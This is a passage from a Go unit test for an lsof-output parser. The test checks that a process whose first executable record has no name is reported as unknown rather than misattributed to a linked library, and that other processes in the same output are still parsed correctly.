// would report a linked library as the caller — naming the wrong file in the
// one dialog that authorizes the read. Giving up is the honest answer.
func TestParseLsofTxt_NamelessFirstRecordIsNotSkipped(t *testing.T) {
	// The second process is here to pin that giving up is scoped to the process
	// with the nameless record, not to the rest of the batch.
	out := "p1\nftxt\nftxt\nn/usr/lib/dyld\np2\nftxt\nn/bin/zsh\n"
	got := caller.ParseLsofTxtForTest(out)
	if got[1] != "" {
		t.Errorf("parseLsofTxt[1] = %q, want \"\" — a nameless first txt record must not fall through to a library", got[1])
	}
	if got[2] != "/bin/zsh" {
		t.Errorf("parseLsofTxt[2] = %q, want %q — one bad section must not discard the others", got[2], "/bin/zsh")
	}
}
